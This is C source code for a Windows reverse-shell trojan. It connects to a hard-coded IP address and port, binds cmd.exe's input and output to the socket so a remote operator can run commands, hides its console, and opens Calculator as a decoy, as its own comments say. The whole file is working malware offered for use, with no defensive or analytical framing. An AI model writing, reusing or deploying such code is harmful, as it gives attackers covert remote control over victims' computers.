// AUTHOR : #Captain_Nemo

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")   //  indicates to the linker that the Ws2_32.lib file is required
#define DEF_BUFF 2048


void rsh(char* server, int Port) 
{
   int incr=0;
   // do 
    // {
       // _sleep(50000); 
        SOCKET sock1;
        sockaddr_in address;
        WSADATA ver;
        WSAStartup(MAKEWORD(2,2), &ver);
        sock1 = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL); //create | initialize socket
        address.sin_family = AF_INET; // std socket def 
        address.sin_addr.s_addr = inet_addr(server); // std socket def & initializing the ip from main() function
        address.sin_port = htons(Port); // std socket def & initializing the port from main() function


            WSAConnect(sock1, (SOCKADDR*)&address, sizeof(address), NULL, NULL, NULL, NULL); // Call WSAConnect Function for socket bind
            char Rec_dat[DEF_BUFF];
            memset(Rec_dat, 0, sizeof(Rec_dat));
            int Rec_code = recv(sock1, Rec_dat, DEF_BUFF, 0);  // define recieve code 
            if (Rec_code <= 0) {
                closesocket(sock1);
                WSACleanup();
               // continue;
            } // end if 
            else {
                char Proc[] = "cmd.exe"; // define process to be called 
                STARTUPINFO str_in;
                PROCESS_INFORMATION proc_in;
                memset(&str_in, 0, sizeof(str_in));
                str_in.cb = sizeof(str_in);
                str_in.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                str_in.hStdInput = str_in.hStdOutput = str_in.hStdError = (HANDLE) sock1; // passing process handle to socket
                CreateProcess(NULL, Proc, NULL, NULL, TRUE, 0, NULL, NULL, &str_in, &proc_in); // create process cmd 
                WaitForSingleObject(proc_in.hProcess, INFINITE);
                CloseHandle(proc_in.hProcess);
                CloseHandle(proc_in.hThread);

                memset(Rec_dat, 0, sizeof(Rec_dat));
                int Rec_code = recv(sock1, Rec_dat, DEF_BUFF, 0);
                if (Rec_code <= 0) 
                {
                    closesocket(sock1);
                    WSACleanup();
                   // continue;
                } // end if 
                if (strcmp(Rec_dat, "exit\n") == 0) 
                {
                    exit(0);
                } // end if
            } //end else
      // incr++; // increment incr by 1 every iteration
   // } while(incr <=5); // end do while loop

      while(true){
              _sleep(true); // sleep infinite
                 }

       
} // end method rsh

int main() {
    FreeConsole(); // clear console || allow trojan to run in the background
        char h[] = "192.168.225.197";
        int p = 8080;
        system("start C:\\WINDOWS\\System32\\calc.exe"); // fire decoy
        rsh(h, p);
        return 0;
}


